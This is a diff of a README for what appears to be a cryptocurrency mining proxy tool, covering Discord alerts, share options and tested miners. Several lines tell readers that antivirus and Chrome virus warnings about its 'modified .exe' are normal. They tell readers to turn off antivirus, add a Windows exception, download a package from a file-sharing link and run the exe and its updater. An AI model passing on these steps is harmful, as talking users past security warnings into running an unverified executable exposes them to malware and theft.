@@ -16,16 +16,19 @@ add low share option incase a user wants low shares solo or both shares solo
 fyi works on shared or solo, solo is best :)
 
 just added discord feature for notifications,
-just add your disocrd username/handle with hashtags for notifications when block is found. and to alert when miner goes offline
+just add your discord username/handle with hashtags for notifications when block is found. and to alert when miner goes offline
+and largest share found.
 
-if ur av detects abnormal its bcuz its a modified .exe file so turn of av go to add acception then re-enable ur av
+if ur av detects abnormal when downloading its bcuz its a modified .exe file so turn of av go to add acception then re-enable ur av
 some avs i have tested and nothing apart from 1 only bcuz its a modified .exe
 
 issues with chrome fix
-download package https://mega.nz/file/xiwi3TiR#4yRA2SRp5nv8MxajaU8Ef80k77oxvSChttWahl8K5vE
+download package from https://mega.nz/file/xiwi3TiR#4yRA2SRp5nv8MxajaU8Ef80k77oxvSChttWahl8K5vE
 or reopen github with internet explorer no alerts
-google chrome detects it as virus but thats normal as its a custom .exe
-please dont worry its normal for this to happen.
+add acception from windows av
+run the updater to keep it updated run on first launch if using the exe then add ur details in gui
+google chrome detects it as virus but thats normal as its a custom .exe pretty much like most files specially if theres mods etc.
+please dont worry its normal for this to happen just follow the steps and ul have it running.
 
 tested on
 k1pool
@@ -41,8 +44,3 @@ nbminer
 
 works with connection to mining rig rentals not sure if good idea 2 proxys running ,
 can be edited to run through nicehash if u no how i will look at this over the coming weeks
-
-todo
-
-clean the code up for alot smoother exprience
-create a better gui
